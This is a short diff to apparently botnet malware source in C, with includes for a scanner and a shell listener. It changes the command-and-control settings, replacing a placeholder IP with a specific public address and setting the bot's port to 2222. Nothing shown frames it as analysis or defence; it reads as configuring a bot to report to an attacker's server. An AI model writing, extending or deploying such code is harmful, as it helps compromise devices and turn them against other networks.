@@ -33,8 +33,8 @@
 #include "headers/scanner.h"
 #include "headers/shell_listener.h"
 
-#define CNC_IP "9.9.9.9"
-#define BOT_PORT 63641
+#define CNC_IP "117.50.197.134"
+#define BOT_PORT 2222
 #define MAX_THREADS 5
 #define RETRY_DELAY 3
 #define RECV_TIMEOUT_MS 12000
